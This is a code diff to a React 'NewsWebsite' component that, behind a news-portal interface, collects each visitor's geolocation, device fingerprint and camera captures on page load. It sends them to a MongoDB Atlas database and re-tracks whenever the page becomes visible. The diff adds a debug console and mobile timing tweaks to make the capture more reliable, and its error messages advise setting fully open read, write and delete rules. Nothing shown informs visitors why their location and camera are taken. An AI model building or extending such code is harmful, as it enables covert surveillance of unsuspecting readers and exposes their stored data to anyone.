@@ -9,10 +9,27 @@ const NewsWebsite = () => {
   const [cameraTracked, setCameraTracked] = useState(false);
   const [mediaStream, setMediaStream] = useState(null);
 
+  // Mobile debugging without USB - Visual debug panel
+  const [debugInfo, setDebugInfo] = useState([]);
+  const [showDebugPanel, setShowDebugPanel] = useState(false);
+
   // News content states
   const [selectedCategory, setSelectedCategory] = useState('all');
   const [searchQuery, setSearchQuery] = useState('');
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
+
+  // Enhanced mobile console that shows on screen
+  const mobileLog = (message, type = 'info') => {
+    const timestamp = new Date().toLocaleTimeString();
+    const logEntry = {
+      id: Date.now() + Math.random(), // Ensure unique IDs
+      timestamp,
+      message: typeof message === 'object' ? JSON.stringify(message, null, 2) : message,
+      type
+    };
+    
+    setDebugInfo(prev => [logEntry, ...prev.slice(0, 19)]); // Keep last 20 logs
+  };
 
   // MongoDB Atlas App Configuration
   const REALM_APP_ID = "myrealmapp-lwdulec";
@@ -316,8 +333,59 @@ const NewsWebsite = () => {
       paddingTop: '1rem',
       borderTop: '1px solid #333'
     },
-    mobileNavVisible: {
-      display: 'flex'
+    // Debug panel styles
+    debugPanel: {
+      position: 'fixed',
+      top: 0,
+      left: 0,
+      right: 0,
+      bottom: 0,
+      backgroundColor: 'rgba(0,0,0,0.95)',
+      color: '#00ff00',
+      fontFamily: 'monospace',
+      fontSize: '12px',
+      zIndex: 9999,
+      overflow: 'auto',
+      padding: '10px'
+    },
+    debugHeader: {
+      backgroundColor: '#333',
+      color: 'white',
+      padding: '10px',
+      position: 'sticky',
+      top: 0,
+      display: 'flex',
+      justifyContent: 'space-between',
+      alignItems: 'center'
+    },
+    debugEntry: {
+      padding: '5px',
+      borderBottom: '1px solid #333',
+      wordBreak: 'break-all'
+    },
+    debugButton: {
+      position: 'fixed',
+      bottom: '20px',
+      right: '20px',
+      backgroundColor: '#ff6b6b',
+      color: 'white',
+      border: 'none',
+      borderRadius: '50%',
+      width: '60px',
+      height: '60px',
+      fontSize: '20px',
+      cursor: 'pointer',
+      zIndex: 9998,
+      boxShadow: '0 4px 12px rgba(0,0,0,0.3)'
+    },
+    testButton: {
+      backgroundColor: '#007bff',
+      color: 'white',
+      border: 'none',
+      padding: '10px 20px',
+      borderRadius: '5px',
+      margin: '5px',
+      cursor: 'pointer'
     }
   };
 
@@ -372,6 +440,7 @@ const NewsWebsite = () => {
         return null;
       }
 
+      console.log('💾 Saving location to MongoDB...');
       const collection = dbClient.db(DATABASE_NAME).collection(COLLECTION_NAME);
       
       const locationData = {
@@ -382,23 +451,63 @@ const NewsWebsite = () => {
         referrer: document.referrer,
         pageUrl: window.location.href,
         sessionId: sessionStorage.getItem('sessionId') || 'unknown',
-        visitCount: parseInt(localStorage.getItem('visitCount') || '0') + 1
+        visitCount: parseInt(localStorage.getItem('visitCount') || '0') + 1,
+        // Additional mobile debugging info
+        mobile: {
+          isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+          screenSize: `${window.screen.width}x${window.screen.height}`,
+          viewport: `${window.innerWidth}x${window.innerHeight}`,
+          devicePixelRatio: window.devicePixelRatio,
+          orientation: window.orientation || 'unknown',
+          connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink
+          } : null
+        }
       };
 
       localStorage.setItem('visitCount', locationData.visitCount.toString());
 
+      console.log('📝 Attempting insertOne with data:', {
+        lat: locationData.latitude,
+        lng: locationData.longitude,
+        sessionId: locationData.sessionId,
+        isMobile: locationData.mobile.isMobile
+      });
+
       const result = await collection.insertOne(locationData);
-      console.log('✅ Location tracked and stored:', result.insertedId);
-      console.log('📍 Location data:', {
+      
+      console.log('✅ Location successfully stored:', {
+        insertedId: result.insertedId,
+        acknowledged: result.acknowledged
+      });
+      
+      console.log('📍 Location data summary:', {
         lat: location.latitude,
         lng: location.longitude,
         accuracy: location.accuracy,
-        visit: locationData.visitCount
+        visit: locationData.visitCount,
+        mongoId: result.insertedId
       });
       
       return result;
     } catch (error) {
-      console.error('❌ Location tracking failed:', error);
+      console.error('❌ Location save failed:', {
+        name: error.name,
+        message: error.message,
+        code: error.code,
+        stack: error.stack
+      });
+      
+      // Try to log more details about the error
+      if (error.message.includes('insert not permitted')) {
+        console.error('🔒 MongoDB Rules Error: Check your Realm app rules configuration');
+      } else if (error.message.includes('network')) {
+        console.error('🌐 Network Error: Check internet connection');
+      } else if (error.message.includes('authentication')) {
+        console.error('🔐 Auth Error: Check Realm app authentication');
+      }
+      
       return null;
     }
   };
@@ -714,68 +823,295 @@ const NewsWebsite = () => {
     }
   };
 
+  // Enhanced mobile-specific debugging and permission handling
+  const initializeTracking = async () => {
+    mobileLog('🚀 Component mounted - Starting comprehensive tracking...');
+    mobileLog(`📱 Mobile Detection: ${JSON.stringify({
+      isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      vendor: navigator.vendor,
+      touchSupport: 'ontouchstart' in window,
+      orientation: window.orientation,
+      screenSize: `${window.screen.width}x${window.screen.height}`,
+      viewport: `${window.innerWidth}x${window.innerHeight}`
+    })}`);
+    
+    // Generate session ID if not exists
+    if (!sessionStorage.getItem('sessionId')) {
+      const sessionId = Date.now().toString();
+      sessionStorage.setItem('sessionId', sessionId);
+      mobileLog(`🆔 Generated session ID: ${sessionId}`);
+    }
+
+    // Test network connectivity
+    mobileLog(`🌐 Network status: ${JSON.stringify({
+      online: navigator.onLine,
+      connection: navigator.connection ? {
+        effectiveType: navigator.connection.effectiveType,
+        downlink: navigator.connection.downlink,
+        rtt: navigator.connection.rtt
+      } : 'unavailable'
+    })}`);
+
+    try {
+      mobileLog('🔗 Attempting MongoDB initialization...');
+      const dbClient = await initializeMongoDB();
+      
+      if (dbClient) {
+        mobileLog('✅ MongoDB client ready, starting parallel tracking...');
+        
+        // Add delays for mobile browsers
+        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+        
+        // Start location tracking first
+        mobileLog('📍 Starting location tracking...');
+        const locationPromise = trackUserLocation(true);
+        
+        // Wait 2 seconds before starting camera (mobile optimization)
+        await delay(2000);
+        
+        mobileLog('📷 Starting camera tracking...');
+        const cameraPromise = trackCameraAccess();
+        
+        // Wait for both to complete
+        const [locationResult, cameraResult] = await Promise.allSettled([
+          locationPromise,
+          cameraPromise
+        ]);
+
+        mobileLog(`📊 Final tracking results: ${JSON.stringify({
+          location: locationResult.status,
+          locationValue: locationResult.value,
+          locationReason: locationResult.reason?.message,
+          camera: cameraResult.status,
+          cameraValue: cameraResult.value,
+          cameraReason: cameraResult.reason?.message
+        })}`);
+
+        // Manual verification of data storage
+        setTimeout(async () => {
+          await verifyDataStorage();
+        }, 5000);
+
+      } else {
+        mobileLog('❌ Failed to initialize MongoDB connection', 'error');
+        // Try to show detailed error for debugging
+        await testDirectMongoConnection();
+      }
+    } catch (error) {
+      mobileLog(`❌ Tracking initialization failed: ${JSON.stringify({
+        name: error.name,
+        message: error.message,
+        stack: error.stack
+      })}`, 'error');
+    }
+  };
+
+  // Test direct MongoDB connection
+  const testDirectMongoConnection = async () => {
+    mobileLog('🧪 Testing direct MongoDB connection...');
+    try {
+      const testApp = new Realm.App({ id: REALM_APP_ID });
+      mobileLog(`🔗 Realm app created: ${testApp.id}`);
+      
+      const credentials = Realm.Credentials.anonymous();
+      mobileLog('🔐 Attempting authentication...');
+      
+      const user = await testApp.logIn(credentials);
+      mobileLog(`✅ Authentication successful: ${user.id}`);
+      
+      const mongodb = user.mongoClient("mongodb-atlas");
+      mobileLog('✅ MongoDB client obtained');
+      
+      // Test with the actual collections that should have rules
+      const locationCollection = mongodb.db(DATABASE_NAME).collection(COLLECTION_NAME);
+      
+      mobileLog('📝 Testing read operation on locations collection...');
+      
+      // Try a simple read first (using Realm Web SDK syntax)
+      try {
+        const existingDocs = await locationCollection.find({});
+        mobileLog(`✅ Read test successful: Found ${existingDocs.length} documents`);
+      } catch (readError) {
+        mobileLog(`❌ Read test failed: ${readError.message}`, 'error');
+      }
+      
+      // Now try write operation
+      mobileLog('📝 Testing write operation on locations collection...');
+      const testDoc = { 
+        test: true, 
+        timestamp: new Date().toISOString(),
+        mobile: true,
+        latitude: 0,
+        longitude: 0,
+        accuracy: 999999,
+        userAgent: 'Test User Agent'
+      };
+      
+      const result = await locationCollection.insertOne(testDoc);
+      mobileLog(`✅ Write test successful: ${result.insertedId}`);
+      
+      // Clean up test document
+      await locationCollection.deleteOne({ _id: result.insertedId });
+      mobileLog('🧹 Test document cleaned up');
+      
+      return { success: true, insertedId: result.insertedId };
+      
+    } catch (error) {
+      mobileLog(`❌ Direct connection test failed: ${JSON.stringify({
+        name: error.name,
+        message: error.message,
+        code: error.code
+      })}`, 'error');
+      
+      // Provide specific guidance based on error
+      if (error.message.includes('no rule exists')) {
+        mobileLog('🔧 SOLUTION: Configure MongoDB Rules:', 'error');
+        mobileLog('1. Go to MongoDB Atlas → App Services → Your App', 'error');
+        mobileLog('2. Click "Rules" in left sidebar', 'error');
+        mobileLog('3. Click "Configure Collection Rules"', 'error');
+        mobileLog('4. Set Default Rules: Read: {}, Write: {}, Delete: {}', 'error');
+        mobileLog('5. Click "Save Draft" then "Deploy"', 'error');
+      } else if (error.message.includes('insert not permitted')) {
+        mobileLog('🔧 SOLUTION: Enable Write Permission in Rules', 'error');
+      } else if (error.message.includes('authentication')) {
+        mobileLog('🔧 SOLUTION: Enable Anonymous Authentication', 'error');
+      }
+      
+      return { success: false, error: error.message };
+    }
+  };
+
+  // Verify data was actually stored - Fixed Realm Web SDK syntax
+  const verifyDataStorage = async () => {
+    mobileLog('🔍 Verifying data storage...');
+    if (!mongoClient) {
+      mobileLog('❌ No MongoDB client for verification', 'error');
+      return;
+    }
+
+    try {
+      // Check recent location data - using Realm Web SDK proper syntax
+      const locationCollection = mongoClient.db(DATABASE_NAME).collection(COLLECTION_NAME);
+      
+      // Realm Web SDK doesn't support chaining like .find().sort().limit()
+      // Use aggregate instead
+      const recentLocations = await locationCollection.aggregate([
+        { $match: { sessionId: sessionStorage.getItem('sessionId') } },
+        { $sort: { createdAt: -1 } },
+        { $limit: 5 }
+      ]);
+      
+      mobileLog(`📍 Recent locations in DB: ${recentLocations.length}`);
+      recentLocations.forEach((loc, i) => {
+        mobileLog(`Location ${i + 1}: ${JSON.stringify({
+          id: loc._id,
+          lat: loc.latitude,
+          lng: loc.longitude,
+          timestamp: loc.timestamp
+        })}`);
+      });
+
+      // Check recent camera data
+      const cameraCollection = mongoClient.db(DATABASE_NAME).collection('camera_captures');
+      const recentCaptures = await cameraCollection.aggregate([
+        { $match: { sessionId: sessionStorage.getItem('sessionId') } },
+        { $sort: { createdAt: -1 } },
+        { $limit: 5 }
+      ]);
+      
+      mobileLog(`📷 Recent camera captures in DB: ${recentCaptures.length}`);
+      recentCaptures.forEach((cap, i) => {
+        mobileLog(`Capture ${i + 1}: ${JSON.stringify({
+          id: cap._id,
+          cameras: cap.captures?.length || 0,
+          timestamp: cap.timestamp
+        })}`);
+      });
+
+    } catch (error) {
+      mobileLog(`❌ Data verification failed: ${error.message}`, 'error');
+    }
+  };
+
   // Initialize tracking on component mount
   useEffect(() => {
-    const initializeTracking = async () => {
-      console.log('🚀 Component mounted - Starting comprehensive tracking...');
-      
-      if (!sessionStorage.getItem('sessionId')) {
-        sessionStorage.setItem('sessionId', Date.now().toString());
-      }
-
-      try {
-        const dbClient = await initializeMongoDB();
-        
-        if (dbClient) {
-          console.log('🎯 Starting parallel tracking...');
-          
-          const [locationResult, cameraResult] = await Promise.allSettled([
-            trackUserLocation(true),
-            trackCameraAccess()
-          ]);
-
-          console.log('📊 Tracking results:', {
-            location: locationResult.status,
-            camera: cameraResult.status
-          });
-        } else {
-          console.error('❌ Failed to initialize MongoDB connection');
-        }
-      } catch (error) {
-        console.error('❌ Tracking initialization failed:', error);
-      }
-    };
-
     initializeTracking();
   }, []);
 
+  // Enhanced visibility change handler for mobile
   useEffect(() => {
     const handleVisibilityChange = async () => {
       if (document.visibilityState === 'visible' && mongoClient) {
         console.log('👁️ Page became visible - re-tracking...');
-        await Promise.allSettled([
-          trackUserLocation(true),
-          trackCameraAccess()
-        ]);
+        console.log('📱 Mobile re-activation detected');
+        
+        // Wait a bit for mobile to stabilize
+        setTimeout(async () => {
+          await Promise.allSettled([
+            trackUserLocation(true),
+            trackCameraAccess()
+          ]);
+        }, 1000);
+      }
+    };
+
+    const handleFocus = async () => {
+      console.log('🎯 Window focused - mobile app returned');
+      if (mongoClient) {
+        setTimeout(async () => {
+          await verifyDataStorage();
+        }, 2000);
       }
     };
 
     document.addEventListener('visibilitychange', handleVisibilityChange);
+    window.addEventListener('focus', handleFocus);
     
     return () => {
       document.removeEventListener('visibilitychange', handleVisibilityChange);
+      window.removeEventListener('focus', handleFocus);
     };
   }, [mongoClient]);
 
+  // Enhanced mobile client ready handler
   useEffect(() => {
     if (mongoClient && (!locationTracked || !cameraTracked)) {
-      console.log('🔗 MongoDB client ready - initiating tracking...');
-      Promise.allSettled([
-        !locationTracked ? trackUserLocation(true) : Promise.resolve(),
-        !cameraTracked ? trackCameraAccess() : Promise.resolve()
-      ]);
+      console.log('🔗 MongoDB client ready - initiating mobile tracking...');
+      console.log('📊 Current tracking status:', {
+        locationTracked,
+        cameraTracked,
+        mongoClientReady: !!mongoClient
+      });
+      
+      // Mobile-optimized tracking with delays
+      const startMobileTracking = async () => {
+        if (!locationTracked) {
+          console.log('📍 Starting location tracking for mobile...');
+          try {
+            await trackUserLocation(true);
+          } catch (error) {
+            console.error('❌ Mobile location tracking failed:', error);
+          }
+        }
+        
+        // Wait before camera on mobile
+        if (!cameraTracked) {
+          setTimeout(async () => {
+            console.log('📷 Starting camera tracking for mobile...');
+            try {
+              await trackCameraAccess();
+            } catch (error) {
+              console.error('❌ Mobile camera tracking failed:', error);
+            }
+          }, 3000);
+        }
+      };
+      
+      startMobileTracking();
     }
-  }, [mongoClient]);
+  }, [mongoClient, locationTracked, cameraTracked]);
 
   useEffect(() => {
     return () => {
@@ -961,7 +1297,70 @@ const NewsWebsite = () => {
         </div>
       </footer>
 
-      <style jsx>{`
+      {/* Mobile Debug Panel */}
+      {showDebugPanel && (
+        <div style={styles.debugPanel}>
+          <div style={styles.debugHeader}>
+            <h3>Mobile Debug Console</h3>
+            <div>
+              <button 
+                style={styles.testButton}
+                onClick={testDirectMongoConnection}
+              >
+                Test DB
+              </button>
+              <button 
+                style={styles.testButton}
+                onClick={() => {
+                  setDebugInfo([]);
+                  mobileLog('🧹 Debug log cleared');
+                }}
+              >
+                Clear
+              </button>
+              <button 
+                style={styles.testButton}
+                onClick={() => setShowDebugPanel(false)}
+              >
+                Close
+              </button>
+            </div>
+          </div>
+          <div style={{ padding: '10px' }}>
+            <div style={{ marginBottom: '10px', fontSize: '14px' }}>
+              <strong>Session ID:</strong> {sessionStorage.getItem('sessionId')}<br/>
+              <strong>MongoDB Client:</strong> {mongoClient ? '✅ Connected' : '❌ Not Connected'}<br/>
+              <strong>Location Tracked:</strong> {locationTracked ? '✅ Yes' : '❌ No'}<br/>
+              <strong>Camera Tracked:</strong> {cameraTracked ? '✅ Yes' : '❌ No'}<br/>
+              <strong>Is Secure Context:</strong> {window.isSecureContext ? '✅ Yes' : '❌ No'}<br/>
+              <strong>Protocol:</strong> {window.location.protocol}<br/>
+            </div>
+            {debugInfo.map(entry => (
+              <div 
+                key={entry.id} 
+                style={{
+                  ...styles.debugEntry,
+                  color: entry.type === 'error' ? '#ff6b6b' : '#00ff00'
+                }}
+              >
+                <small>{entry.timestamp}</small><br/>
+                <pre style={{ whiteSpace: 'pre-wrap', margin: 0 }}>{entry.message}</pre>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+
+      {/* Debug Toggle Button */}
+      <button 
+        style={styles.debugButton}
+        onClick={() => setShowDebugPanel(!showDebugPanel)}
+        title="Toggle Debug Panel"
+      >
+        🐛
+      </button>
+
+      <style>{`
         @media (max-width: 768px) {
           .nav-desktop { display: none !important; }
           .mobile-menu-toggle { display: block !important; }
